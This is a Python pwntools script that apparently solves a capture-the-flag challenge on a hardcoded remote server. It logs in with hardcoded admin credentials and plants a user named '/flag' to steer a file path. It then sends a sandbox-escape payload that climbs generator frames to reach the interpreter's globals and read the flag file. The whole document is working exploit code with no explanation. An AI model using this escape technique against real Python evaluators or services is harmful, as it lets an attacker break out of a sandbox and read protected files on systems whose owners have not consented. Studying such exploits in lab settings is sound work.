from pwn import *

# nc 103.145.226.209 13337
HOST = "103.145.226.209"
PORT = 13337

io = remote(HOST, PORT)
session_admin = None
session_user = None
is_login_admin = None

def login_admin():
    global session_admin
    global is_login_admin
    assert is_login_admin == None
    if session_admin is not None:
        io.sendlineafter(b"Your choice: ", b"2")
        io.sendlineafter(b"Your choice: ", b"2")
        io.sendlineafter(b"Session key: ", session_admin)
        is_login_admin = True
        return
    io.sendlineafter(b"Your choice: ", b"1")
    io.sendlineafter(b"Username: ", b" admin_handsome_zzz")
    io.sendlineafter(b"Password: ", b"1234567890")
    session_admin = io.recvline().strip().split(b": ")[1]
    return login_admin()

def login_user():
    global session_user
    global is_login_admin
    global user_name
    assert is_login_admin == None
    if session_user is not None:
        io.sendlineafter(b"Your choice: ", b"2")
        io.sendlineafter(b"Your choice: ", b"2")
        io.sendlineafter(b"Session key: ", session_user)
        is_login_admin = False
        return
    io.sendlineafter(b"Your choice: ", b"1")
    io.sendlineafter(b"Username: ", user_name)
    io.sendlineafter(b"Password: ", b"1234567890")
    session_user = io.recvline().strip().split(b": ")[1]
    return login_user()

def logout():
    global is_login_admin
    if is_login_admin == True:
        io.sendlineafter(b"Your choice: ", b"2")
        is_login_admin = None
    elif is_login_admin == False:
        io.sendlineafter(b"Your choice: ", b"3")
        is_login_admin = None

def send_feedback(feedback_payload):
    global is_login_admin
    if is_login_admin != False:
        if is_login_admin == True:
            logout()
        login_user()
    io.sendlineafter(b"Your choice: ", b"2")
    response = io.recv(1).decode()
    if response == "F":
        response = ""
        io.sendlineafter(b"eedback:", feedback_payload.encode())
    response += io.recvline().strip().decode()
    print("Response Feedback:", response)

def send_payload(payload):
    global is_login_admin
    if is_login_admin != True:
        if is_login_admin == False:
            logout()
        login_admin()
    io.sendlineafter(b"Your choice: ", b"1")
    io.sendlineafter(b"Input(X [+-*/] Y): ", payload.encode())
    print("Result payload:", io.recvline().strip().decode())
    
user_name = b"/flag" # the username make the path will be `/flag`

send_feedback("AHHHHHHH!!!!")
send_payload("[p:=[a:=[],a.append(b.gi_frame.f_back.f_back for b in a),*a[0]][2], p.f_globals[p.f_code.co_filename[8]]][1].read()")